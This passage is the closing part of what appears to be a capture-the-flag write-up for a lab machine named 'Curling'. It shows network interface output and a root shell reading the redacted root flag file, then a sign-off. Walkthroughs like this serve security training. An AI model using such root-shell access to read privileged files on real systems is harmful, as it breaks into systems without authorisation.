1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:95:aa:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.150/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:aa67/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:fe95:aa67/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
root@curling:/home/floris# cat /root/root.txt
cat /root/root.txt
<redacted>
root@curling:/home/floris# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:95:aa:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.150/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:aa67/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe95:aa67/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
SWEEP!  And with that we swept up the flags on Curling!  Hopefully, you enjoyed the read.  See you in the next one.